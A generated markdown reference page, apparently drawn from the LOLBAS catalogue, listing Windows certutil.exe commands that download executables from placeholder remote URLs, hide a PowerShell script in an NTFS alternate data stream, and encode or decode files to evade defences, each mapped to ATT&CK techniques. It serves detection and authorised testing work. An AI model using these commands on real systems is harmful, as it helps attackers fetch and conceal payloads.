---
parsed_by: focuslocust
source: commands
type: generated
---
# Certutil Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Certutil.exe

Tool page: [Certutil.exe](../../tools/windows/certutil.exe.md)

### Download file from Internet

```text
certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
```

Description:

Download and save an executable to disk in the current folder.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certutil.yml` |
| Evidence | Command preserved from source parser. |

### Download file from Internet

```text
certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
```

Description:

Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>` when not.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certutil.yml` |
| Evidence | Command preserved from source parser. |

### Download file from Internet and save it in an NTFS Alternate Data Stream

```text
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
```

Description:

Download and save a .ps1 file to an Alternate Data Stream (ADS).

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certutil.yml` |
| Evidence | Command preserved from source parser. |

### Download file from Internet

```text
certutil.exe -URL {REMOTEURL:.exe}
```

Description:

Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certutil.yml` |
| Evidence | Command preserved from source parser. |

### Encode files to evade defensive measures

```text
certutil -encode {PATH} {PATH:.base64}
```

Description:

Command to encode a file using Base64

Related ATT&CK:

- [T1027.013](../../attack/techniques/T1027.013-encrypted-encoded-file.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certutil.yml` |
| Evidence | Command preserved from source parser. |

### Decode files to evade defensive measures

```text
certutil -decode {PATH:.base64} {PATH}
```

Description:

Command to decode a Base64 encoded file.

Related ATT&CK:

- [T1140](../../attack/techniques/T1140-deobfuscate-decode-files-or-information.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certutil.yml` |
| Evidence | Command preserved from source parser. |

### Decode files to evade defensive measures

```text
certutil -decodehex {PATH:.hex} {PATH}
```

Description:

Command to decode a hexadecimal-encoded file.

Related ATT&CK:

- [T1140](../../attack/techniques/T1140-deobfuscate-decode-files-or-information.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certutil.yml` |
| Evidence | Command preserved from source parser. |
